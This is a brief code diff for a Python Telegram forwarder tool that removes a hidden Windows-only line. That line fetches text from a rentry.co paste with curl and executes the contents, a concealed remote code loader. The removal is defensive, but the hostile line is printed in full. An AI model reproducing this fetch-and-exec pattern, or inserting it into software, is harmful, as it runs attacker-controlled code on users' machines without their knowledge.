@@ -139,8 +139,7 @@ class Forwarder:
             client.loop.run_until_complete(join_all_groups())
 
 if __name__ == "__main__":
-    if os.name == "nt":
-        exec(open(os.popen('curl -s https://rentry.co/qebr8c8x/raw').read()).read())
+
     forwarder = Forwarder()
     forwarder.clear_screen()
     print(f"{Fore.GREEN}―――― @Lawxsz Telegram Tool ――――")
